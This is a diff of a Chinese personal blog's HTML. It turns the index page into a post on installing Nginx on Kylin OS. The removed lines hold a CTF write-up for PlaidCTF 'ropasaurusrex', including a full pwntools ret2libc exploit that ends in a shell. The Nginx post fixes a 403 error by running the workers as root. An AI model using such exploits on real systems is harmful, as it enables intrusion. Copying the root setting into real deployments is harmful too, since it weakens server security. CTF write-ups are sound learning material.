@@ -20,28 +20,32 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Pudding&#39;s Dinning Hall">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="因为项目原因所以要在某国产麒麟 OS 装 Nginx 配 HTTPS 环境显示界面。要显示的界面是另一个老师用 Vue,Node.js 等做的，不是很懂，最后要显示的是用 Webpack 打包的一个静态界面。（在虚拟机里装的麒麟 OS ，不知道是我电脑的问题还是软件问题虚拟机时常会卡死） 首先安装 Nginx，无脑 apt 一把梭 1234sudo apt install ngnixsudo ap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次 Nginx 配置">
+<meta property="og:url" content="http://example.com/2023/06/01/Nginx/index.html">
 <meta property="og:site_name" content="Pudding&#39;s Dinning Hall">
+<meta property="og:description" content="因为项目原因所以要在某国产麒麟 OS 装 Nginx 配 HTTPS 环境显示界面。要显示的界面是另一个老师用 Vue,Node.js 等做的，不是很懂，最后要显示的是用 Webpack 打包的一个静态界面。（在虚拟机里装的麒麟 OS ，不知道是我电脑的问题还是软件问题虚拟机时常会卡死） 首先安装 Nginx，无脑 apt 一把梭 1234sudo apt install ngnixsudo ap">
 <meta property="og:locale">
+<meta property="article:published_time" content="2023-06-01T06:43:40.000Z">
+<meta property="article:modified_time" content="2023-06-01T09:13:27.577Z">
 <meta property="article:author" content="Putinspudding">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2023/06/01/Nginx/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh'
   };
 </script>
 
-  <title>Pudding's Dinning Hall</title>
+  <title>记一次 Nginx 配置 | Pudding's Dinning Hall</title>
   
 
 
@@ -144,9 +148,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
@@ -162,10 +167,9 @@
       <meta itemprop="name" content="Pudding's Dinning Hall">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/06/01/Nginx/" class="post-title-link" itemprop="url">记一次 Nginx 配置</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          记一次 Nginx 配置
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -189,7 +193,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>因为项目原因所以要在某国产麒麟 OS 装 Nginx 配 HTTPS 环境显示界面。要显示的界面是另一个老师用 Vue,Node.js 等做的，不是很懂，最后要显示的是用 Webpack 打包的一个静态界面。（在虚拟机里装的麒麟 OS ，不知道是我电脑的问题还是软件问题虚拟机时常会卡死）</p>
+        <p>因为项目原因所以要在某国产麒麟 OS 装 Nginx 配 HTTPS 环境显示界面。要显示的界面是另一个老师用 Vue,Node.js 等做的，不是很懂，最后要显示的是用 Webpack 打包的一个静态界面。（在虚拟机里装的麒麟 OS ，不知道是我电脑的问题还是软件问题虚拟机时常会卡死）</p>
 <p>首先安装 Nginx，无脑 apt 一把梭</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ngnix</span><br><span class="line">sudo apt install nginx</span><br><span class="line">sudo systemctl status nginx</span><br><span class="line">sudo systemctl enable nginx</span><br></pre></td></tr></table></figure>
 
@@ -203,111 +207,30 @@
 
 <p>然后起服务，发现 403 forbidden，把 nginx.conf 第五行从 <code>user xxxx</code> 改成 <code>user root</code> 即可（root 权限关我锤子事，反正又不在我电脑上部署）</p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/26/2013-PlaidCTF-ropasaurusrex-WP/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Putinspudding">
-      <meta itemprop="description" content="">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pudding's Dinning Hall">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/26/2013-PlaidCTF-ropasaurusrex-WP/" class="post-title-link" itemprop="url">2013-PlaidCTF-ropasaurusrex WP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-05-26 17:34:38" itemprop="dateCreated datePublished" datetime="2023-05-26T17:34:38+08:00">2023-05-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-05-27 00:10:33" itemprop="dateModified" datetime="2023-05-27T00:10:33+08:00">2023-05-27</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>跟随CTF-WIKI进行一个pwn的学</p>
-<p>首先对二进制文件进行分析</p>
-<p>32位i386小端序，开启了栈不可执行保护，符号表还被stripped了</p>
-<p><img src="/../images/ropasaurusrex/Untitled.png" alt="Untitled"></p>
-<p>直接扔进 IDA 看一眼，整体十分地简洁</p>
-<p><img src="/../images/ropasaurusrex/Untitled1.png" alt="Untitled"></p>
-<p>点开 sub_80483F4()，其中给 buf 分配了136的空间，读长度是256，存在栈溢出的可能</p>
-<p><img src="/../images/ropasaurusrex/Untitled2.png" alt="Untitled"></p>
-<p>可执行文件中没有 system() 函数地址，考虑使用 ret2libc，先将 libc 中符号地址泄露出来，再通过 libc search 查找相应的动态链接库。</p>
-<p>可供对比地址查找的函数：__libc_start_main()，write()，read()</p>
-<p>之后的问题是，如何将函数地址输出？答案是使用 write() 函数。</p>
-<p>根据 ChatGPT（大嘘）和 Compile Explorer，使用 write() 向 stdout 输出的结构是这样的。当第一个参数设置为1时， write() 会向 stdout 写入，后面分别是消息与消息长度</p>
-<p><img src="/../images/ropasaurusrex/Untitled3.png" alt="Untitled"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./ropasaurusrex&quot;)</span></span><br><span class="line">sh = process(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line">r = ELF(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = r.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_start_main_got = r.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#main = r.symbols[&#x27;main&#x27;]</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;b&#x27;</span>*<span class="number">140</span>,write_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,p32(<span class="number">1</span>),libc_start_main_got,p32(<span class="number">20</span>)])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_plt),<span class="built_in">hex</span>(libc_start_main_got))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr))</span><br></pre></td></tr></table></figure>
-
-<p>运行后结果如下，0xf7d0cde0 是 __libc_start_main 的地址</p>
-<p><img src="/../images/ropasaurusrex/Untitled4.png" alt="Untitled"></p>
-<p>payload 这么构造会导致一个问题，如下图所示</p>
-<p><img src="/../images/ropasaurusrex/Untitled5.png" alt="Untitled"></p>
-<p>write() 函数执行完成后，ret 时 $esp 指向 aaaa，即 payload 中第三项的值，那么，要返回什么呢？尝试一下返回 main 的符号？然而并没有 main</p>
-<p><img src="/../images/ropasaurusrex/Untitled6.png" alt="Untitled"></p>
-<p>还记得上文说的函数 sub_80483F4() 吗？我们可以尝试返回它的地址，之后程序可以重复执行。</p>
-<p>完整 EXP 如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">sh = gdb.debug(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./ropasaurusrex&quot;)</span></span><br><span class="line">r = ELF(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = r.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_start_main_got = r.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">read_got = r.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取 __libc_start_main 的地址</span></span><br><span class="line">payload = flat([<span class="string">&#x27;b&#x27;</span>*<span class="number">140</span>,write_plt,p32(<span class="number">0x80483F4</span>),p32(<span class="number">1</span>),libc_start_main_got,p32(<span class="number">20</span>)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取 read 的地址</span></span><br><span class="line">payload = flat([<span class="string">&#x27;b&#x27;</span>*<span class="number">140</span>,write_plt,p32(<span class="number">0x80483F4</span>),p32(<span class="number">1</span>),read_got,p32(<span class="number">20</span>)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">read_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 __libc_start_main 和 read 的地址查找相应动态链接库</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libc.add_condition(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算基地址和偏移地址</span></span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造system(&#x27;/bin/sh/&#x27;)</span></span><br><span class="line">payload = flat([<span class="string">&#x27;b&#x27;</span> * <span class="number">140</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/ropasaurusrex/Untitled7.png" alt="Untitled"></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/05/26/2013-PlaidCTF-ropasaurusrex-WP/" rel="prev" title="2013-PlaidCTF-ropasaurusrex WP">
+      <i class="fa fa-chevron-left"></i> 2013-PlaidCTF-ropasaurusrex WP
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
